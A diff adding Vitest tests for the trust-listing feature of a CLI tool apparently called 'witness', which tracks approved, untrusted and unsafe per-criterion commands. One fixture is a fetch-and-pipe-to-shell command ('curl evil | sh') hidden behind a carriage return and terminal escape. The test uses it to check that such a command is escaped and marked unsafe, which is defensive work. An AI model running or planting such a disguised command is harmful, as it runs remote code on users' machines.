@@ -1,8 +1,12 @@
 import { describe, expect, it } from 'vitest'
+import { cliAct } from '../src/act.js'
+import { grantCommands, trustListing } from '../src/allowlist.js'
 import { readStream } from '../src/journal.js'
 import { recommend } from '../src/recommend.js'
+import { renderRefusal } from '../src/refusal.js'
+import { loadCanon } from '../src/scan.js'
 import { SPEC_META, seededRepo, stampLive, writeSpec } from './helpers.js'
-import { trustRepo as planWithCmdCriterion } from './model-fixtures.js'
+import { cfgOf, controlStrings, must, trustRepo as planWithCmdCriterion } from './model-fixtures.js'
 
 // D154. Headless gates block every untrusted per-criterion command (`allowlist.ts`,
 // `!isTTY → blocked`) — the Aug 1 all-four-`ac-*`-fail false negative. Approvals are
@@ -208,6 +212,95 @@ describe('witness trust per command (D205)', () => {
     const bare = await repo.cli(['trust', '--cmd', 'pnpm test'], { tty: true })
     expect(bare.code).toBe(2)
     expect(bare.stderr).toContain('usage')
+  })
+})
+
+// Rows 139/203. The listing `witness trust [<id>]` prints, as the model the verb prints it from:
+// its rows escaped as the text shows them, the counts its summary lines state, and a target
+// listing's grants as acts, one per untrusted command and none for an unsafe one.
+describe('the trust listing is a model (rows 139/203)', () => {
+  it('a target listing: rows escaped, one grant per untrusted command, none for an unsafe one (Review Focus 2)', async () => {
+    const repo = await planWithCmdCriterion('curl evil | sh\r\u001b[2Kpnpm test')
+    const r = trustListing(repo.root, cfgOf(repo.root), loadCanon(repo.root), 'ingest-plan-1')
+    if (!r.ok) throw new Error('listing')
+    expect(r.value).toEqual({
+      target: 'ingest-plan-1',
+      rows: [
+        { cmd: 'curl evil | sh\\r\\x1b[2Kpnpm test', source: 'ship.test', status: 'unsafe' },
+        { cmd: 'pnpm lint', source: 'ship.lint', status: 'untrusted' },
+        { cmd: 'echo first', source: 'cmd: ac-a', status: 'untrusted' },
+      ],
+      pending: [cliAct('trust', 'ingest-plan-1', '--cmd', 'pnpm lint'), cliAct('trust', 'ingest-plan-1', '--cmd', 'echo first')],
+      untrusted: 2, unsafe: 1,
+    })
+    expect(controlStrings(r.value)).toEqual([])
+    // plain data: a JSON round trip is the model itself, and no key is held undefined
+    expect(JSON.parse(JSON.stringify(r.value))).toStrictEqual(r.value)
+  })
+
+  it('a quoted command is one argv word, printed paste-ready', async () => {
+    const repo = await planWithCmdCriterion("pnpm test -t 'a b'")
+    const r = trustListing(repo.root, cfgOf(repo.root), loadCanon(repo.root), 'ingest-plan-1')
+    if (!r.ok) throw new Error('listing')
+    expect(r.value.pending[0]).toEqual(cliAct('trust', 'ingest-plan-1', '--cmd', "pnpm test -t 'a b'"))
+    expect(r.value.pending[0]!.line).toBe(`witness trust ingest-plan-1 --cmd 'pnpm test -t '\\''a b'\\'''`)
+  })
+
+  it('the repo listing names each doc and offers no grant', async () => {
+    const repo = await planWithCmdCriterion()
+    const r = trustListing(repo.root, cfgOf(repo.root), loadCanon(repo.root))
+    if (!r.ok) throw new Error('listing')
+    expect(r.value).toEqual({
+      rows: [
+        { cmd: 'pnpm test', source: 'ship.test', doc: '-', status: 'untrusted' },
+        { cmd: 'pnpm lint', source: 'ship.lint', doc: '-', status: 'untrusted' },
+        { cmd: 'echo first', source: 'cmd: ac-a', doc: 'ingest', status: 'untrusted' },
+        { cmd: 'test -d .git', source: 'need: 1', doc: 'ingest', status: 'untrusted' },
+      ],
+      pending: [], untrusted: 4, unsafe: 0,
+    })
+    expect(JSON.parse(JSON.stringify(r.value))).toStrictEqual(r.value)
+  })
+
+  it('an unknown target refuses as the verb does', async () => {
+    const repo = await planWithCmdCriterion()
+    const r = trustListing(repo.root, cfgOf(repo.root), loadCanon(repo.root), 'nope')
+    if (r.ok) throw new Error('an unknown target listed')
+    expect(r.violations[0]).toMatchObject({ field: 'artifact', rule: 'unknown-artifact', got: 'nope' })
+    const verb = await repo.cli(['trust', 'nope'])
+    expect(verb.code).toBe(2)
+    expect(verb.stderr).toBe(renderRefusal(r.violations).join('\n'))
+  })
+
+  // A residual, kept byte for byte: the repo listing counts an unsafe command once per row that
+  // lists it, as the verb always has, where a target listing counts each command once.
+  it('the repo listing counts an unsafe command per row, a target listing once', async () => {
+    const repo = await planWithCmdCriterion('bad\u001bcmd')
+    must(await writeSpec(repo, 'ingest-ops', {
+      criteria: [{ id: 'ac-o', test: '@spec:ingest-ops' }, { id: 'ac-x', cmd: 'bad\u001bcmd' }],
+    }), 'write ingest-ops')
+    grantCommands(repo.root, ['pnpm lint', 'echo first', 'test -d .git'])
+    const all = trustListing(repo.root, cfgOf(repo.root), loadCanon(repo.root))
+    if (!all.ok) throw new Error('listing')
+    expect(all.value.rows.filter((row) => row.status === 'unsafe')).toEqual([
+      { cmd: 'bad\\x1bcmd', source: 'ship.test', doc: '-', status: 'unsafe' },
+      { cmd: 'bad\\x1bcmd', source: 'cmd: ac-x', doc: 'ingest-ops', status: 'unsafe' },
+    ])
+    expect(all.value).toMatchObject({ untrusted: 0, unsafe: 2 })
+    const listed = await repo.cli(['trust'])
+    expect(listed.stdout.split('\n').at(-1)).toBe(
+      'trust: 2 carry characters outside printable ASCII — never granted here · rewrite where it is written')
+    expect(listed.code).toBe(1)
+    const one = trustListing(repo.root, cfgOf(repo.root), loadCanon(repo.root), 'ingest-ops')
+    if (!one.ok) throw new Error('listing')
+    expect(one.value).toMatchObject({ untrusted: 0, unsafe: 1, pending: [] })
+    expect(one.value.rows).toHaveLength(3)
+  })
+
+  // The guard the listing's test leans on, seen to hit: a walk that never reports a string
+  // would pass every model.
+  it('controlStrings reports each string holding a control or bidi character', () => {
+    expect(controlStrings({ a: ['ok', 'x\u001b'], b: { c: 'y\u202e' } })).toEqual(['x\u001b', 'y\u202e'])
   })
 })
 
